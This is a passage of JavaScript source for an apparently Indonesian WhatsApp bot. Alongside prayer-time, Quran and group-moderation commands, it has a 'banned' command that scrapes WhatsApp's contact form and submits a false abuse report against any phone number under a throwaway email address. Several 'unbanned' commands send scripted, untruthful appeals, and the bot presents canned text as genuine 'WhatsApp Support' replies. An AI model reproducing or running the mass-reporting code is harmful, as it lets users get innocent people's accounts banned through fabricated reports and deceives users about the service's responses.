 file, cadangan, atau riwayat panggilan dari akun yang dihapus.

 akun sebelum dihapus, Anda akan tetap berada di semua obrolan grup.  Anda akan memiliki opsi untuk memulihkan data Anda.  Pelajari caranya Jika Anda tidak mendaftarkan ulang akun Anda, akun tersebut mungkin akan dihapus dan proses ini tidak dapat dibatalkan.  Sayangnya, WhatsApp tidak dapat membantu Anda memulihkan obrolan, dokumen, media

 Catatan: Jika perangkat Anda hilang atau dicuri, sebaiknya hubungi penyedia seluler Anda untuk memblokir kartu SIM Anda sesegera mungkin.  Memblokir kartu SIM Anda mencegah orang lain mendaftar dan mengakses akun yang terkait dengan kartu SIM.

 Sumber daya terkait:

 ⚫ Untuk informasi lebih lanjut tentang penonaktifan akun pada ponsel yang hilang dan dicuri, silakan baca artikel ini.

 ⚫ Pelajari tentang akun yang dicuri di artikel ini.

 Jika Anda memiliki pertanyaan atau masalah lain, jangan ragu untuk menghubungi kami.  Kami akan dengan senang hati membantu!`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`\`\`\`WhatsApp Support\`\`\`

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply('Masukkan nomor target!')
}break
//=================================================
case 'banned': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return m.reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `I noticed that a user was using modified whatsapp, so i ask support to ban this account for violating terms of service, and the account uses a WhatsApp bot that can send malicious messages so that other users' WhatsApp cannot work
Number : +${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
m.reply(`Tunggu 1-24 Jam untuk proses banned dari bot dan tunggu kurang lebih sekitar 30 detik untuk melihat balasan email dari WhatsApp`)
await loading(180000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`\`\`\`WhatsApp Support\`\`\`

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`\`\`\`WhatsApp Support\`\`\`

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply('Masukkan nomor target!')
}break
//=================================================
case 'unbanned': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return m.reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Aku Tidak Tau Mengapa Nomor Saya Tiba Tiba Di Larang Dari Menggunakan WhatsApp Aku Hanya Membalas Pesan Customer Saya Mohon Buka Larangan Akun WhatsApp Saya: [+${targetnya}]
Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
m.reply(`Tunggu 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply('Masukkan nomor target!')
}
break
//=================================================
case 'unbannedv2': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return m.reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Pihak WhatsApp yang terhormat mohon bantuan anda segera
[${targetnya}]
Saya telah mengirim beberapa email dan laporan ke pihak WhatsApp untuk mengajukan banding agar nomor saya cepat di buka dari daftar blokir, saya sangat membutuhkan untuk keperluan pribadi berkomunikasi dengan keluarga jika saya melakukan pelanggaran sebelumnya maka saya akan menggunakan nomor saya tersebut dengan lebih hati-hati dan lebih baik lagi dari sebelumnya dan saya sekarang telah menuruti apa yang pihak WhatsApp sarankan, dan saya sangat berharap sekarang juga nomor saya dapat di gunakan kembali. Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
m.reply(`Tunggu 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply('Masukkan nomor target!')
}
break
//=================================================
case 'unbannedv3': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return m.reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hola WhatsApp
Actualmente, algunas personas tienen muchas formas efectivas de bloquear números de usuario e informarlos sin ningún motivo, de hecho, conozco bien los términos de servicio y los cumplí, pero algunos piratas informáticos me hicieron un informe falso y mi número fue bloqueado, desbloquee el número ${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
m.reply(`Tunggu 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply('Masukkan nomor target!')
}
break
//=================================================
case 'unbannedv4': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return m.reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Good day whatsApp team. My whatApp account has been burned permanently, please i plead with you unblock it, i cannot use another number again. I don’t know why it is burned but my friends re suggesting its because i use GB whatsApp, which i didn’t know it was wrong. My number is [ ${targetnya} ]. Please whatsApp team, help me unblock my account. please i cannot use a new number as my current number is connected to slot of important things like vacancies.
Thank you`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
m.reply(`Tunggu 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply('Masukkan nomor target!')
}
break
//=================================================
case 'unbannedv5': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return m.reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Aloha WhatsApp, ua ʻaihue ʻia kaʻu helu e ka mea hacker, e ʻoluʻolu e wehe hou iā ia [${targetnya}]`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
m.reply(`Tunggu 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply('Masukkan nomor target!')
}
break
//=================================================
case 'jadwalsholat': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
let help = `📝Fitur ini di gunakan untuk melihat jadwal sholat

📌Contoh: ${prefix + command} Mojokerto`
if (!text) return reply(help)
axios
.get(`https://api.lolhuman.xyz/api/sholat/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var text = `📄Berikut adalah jadwal sholat untuk wilayah ${data.result.wilayah} dan sekitarnya.\n\n`
text += `Tanggal : ${data.result.tanggal}\n`
text += `Sahur : ${data.result.sahur}\n`
text += `Imsak : ${data.result.imsak}\n`
text += `Subuh : ${data.result.subuh}\n`
text += `Terbit : ${data.result.terbit}\n`
text += `Dhuha : ${data.result.dhuha}\n`
text += `Dzuhur : ${data.result.dzuhur}\n`
text += `Ashar : ${data.result.ashar}\n`
text += `Maghrib : ${data.result.imsak}\n`
text += `Isya : ${data.result.isya}`
m.reply(text)
})
.catch(console.error)
}break
//=================================================
case 'kisahnabi': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
let help = `📝Fitur ini di gunakan untuk melihat cerita atau kisah para nabi

📌Contoh: ${prefix + command} Muhammad`
if (!text) return reply(help)
axios
.get(`https://api.lolhuman.xyz/api/kisahnabi/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var text = `Nama : ${data.result.name}\n`
text += `Lahir : ${data.result.thn_kelahiran}\n`
text += `Umur : ${data.result.age}\n`
text += `Tempat : ${data.result.place}\n`
text += `Kisah : \n${data.result.story}`
m.reply(text)
})
.catch(console.error)
}break
//=================================================
case 'alquranaudio': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (args.length == 0) return reply(`📌Contoh : ${prefix + command} 18 Atau ${prefix + command} 18/10`)
hinata.sendMessage(from, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${args[0]}?apikey=${apikey}` }, mimetype: 'audio/mp4' })
}break
//=================================================
case 'asmaulhusna': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
require('./HinataBase/lib/asmaulhusna')
const anjuran = `Dari Abu hurarirah radhiallahu anhu, Rasulullah Saw bersabda: 

إِنَّ لِلَّهِ تَعَالَى تِسْعَةً وَتِسْعِينَ اسْمًا، مِائَةٌ إِلَّا وَاحِدًا، مَنْ أَحْصَاهَا دخل الجنة، وهو وتر يُحِبُّ الْوِتْرَ

ᴀʀᴛɪɴʏᴀ: Sesungguhnya Allah mempunyai sembilan puluh sembilan nama, alias seratus kurang satu. Barang siapa yang menghitung-hitungnya, niscaya masuk surga; Dia Witir dan menyukai yang witir.`
if(!text) return m.reply(`❗Lo gak pernah belajar asmaulhusna ya..\n\n📌 *CONTOH :* ${prefix + command} 1\n\n${anjuran}`)
let json = JSON.parse(JSON.stringify(global.asmaulhusna))
let data = json.map((v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`).join('\n\n')
if (isNaN(args[0])) throw `contoh:\n${usedPrefix + command} 1`
if (args[0]) {
if (args[0] < 1 || args[0] > 99) throw `Lu Gak Pernah Belajar Asmaul Husna Yak?\n${anjuran}`
let { index, latin, arabic, translation_id } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
return m.reply(`No. ${index}
${arabic}
${latin}
${translation_id}
`.trim())
}
}break
//=================================================
case 'listsurah': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
axios
.get(`https://api.lolhuman.xyz/api/quran?apikey=${apikey}`)
.then(({ data }) => {
var text = 'List Surah:\n'
for (var x in data.result) {
text += `${x}. ${data.result[x]}\n`
}
reply(text)
})
.catch(console.error)
}break
//=================================================
case 'alquran': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (args.length < 1) return reply(`📌Contoh: ${prefix + command} 18 Atau ${prefix + command} 18/10 Atau ${prefix + command} 18/1-10`)
axios
.get(`https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var ayat = data.result.ayat
var text = `QS. ${data.result.surah} : 1-${ayat.length}\n\n`
for (var x of ayat) {
text += `${x.arab}\n${x.ayat}. ${x.latin}\n${x.indonesia}\n\n`
}
text = text.replace(/<u>/g, '_').replace(/<\/u>/g, '_')
text = text.replace(/<strong>/g, '*').replace(/<\/strong>/g, '*')
reply(text)
})
.catch(console.error)
}break
//=================================================
case 'welcome': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (args.length < 1) return reply(`ketik ${prefix + command} on untuk mengaktifkan\nketik ${prefix + command} off untuk menonaktifkan`)
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
fs.writeFileSync('./HinataBase/database/wellcome.json', JSON.stringify(wlcm, null, 2))
var groupe = await hinata.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
hinata.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
fs.writeFileSync('./HinataBase/database/wellcome.json', JSON.stringify(wlcm, null, 2))
reply('Sukses Mematikan Welcome  di group ini')
}
}break
//=================================================
case 'autodelete': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return
if (args.length < 1) return reply(`ketik ${prefix + command} on untuk mengaktifkan\nketik ${prefix + command} off untuk menonaktifkan`)
if (args[0] === "on") {
if (autodelete) return m.reply('Sudah Aktif')
antidel.push(from)
fs.writeFileSync('./HinataBase/database/antidel.json', JSON.stringify(antidel, null, 2))
m.reply('autodelete di aktifkan')
} else if (args[0] === "off") {
if (!autodelete) return m.reply('Sudah Non Aktif')
let off = antidel.indexOf(from)
antidel.splice(off, 1)
fs.writeFileSync('./HinataBase/database/antidel.json', JSON.stringify(antidel, null, 2))
m.reply('Sukses Mematikan auto delete')
} else {
}
}break
//=================================================//
case 'antilink': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
if (args[0] === "on") {
if (AntiLinkAll) return m.reply('Telah diaktifkan')
ntilinkall.push(from)
fs.writeFileSync('./HinataBase/database/antilinkall.json', JSON.stringify(ntilinkall, null, 2))
var groupe = await hinata.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
hinata.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nFitur anti link telah di aktifkan.\nSiapapun yang mengirim link di sini akan otomatis di hapus!⛔`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return m.reply('Sudah dinonaktifkan')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./HinataBase/database/antilinkall.json', JSON.stringify(ntilinkall, null, 2))
m.reply('Sukses mematikan semua antilink di grup ini')
} else {
await reply(`Silakan Ketik Opsi\n\n*Contoh :* ${prefix + command} on\n*Contoh :* ${prefix + command} off\n\non untuk mengaktifkan\noff untuk menonaktifkan`)
}
}break
//=================================================
case 'antitoxic': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
if (args[0] === "on") {
if (antiToxic) return m.reply('Telah diaktifkan')
nttoxic.push(from)
fs.writeFileSync('./HinataBase/database/antitoxic.json', JSON.stringify(nttoxic, null, 2))
var groupe = await hinata.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
hinata.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nFitur anti toxic telah di aktifkan.\nSiapapun yang toxic akan otomatis di hapus oleh bot!⛔`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiToxic) return m.reply('Sudah dinonaktifkan')
let off = nttoxic.indexOf(from)
nttoxic.splice(off, 1)
fs.writeFileSync('./HinataBase/database/antitoxic.json', JSON.stringify(nttoxic, null, 2))
m.reply('Sukses mematikan anti toksik di grup ini')
} else {
await reply(`Ketik ${prefix + command} on untuk mengaktifkan\nketik ${prefix + command} off untuk menonaktifkan`)
}
}break
//=================================================//
case 'antilinkwame': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
if (args[0] === "on") {
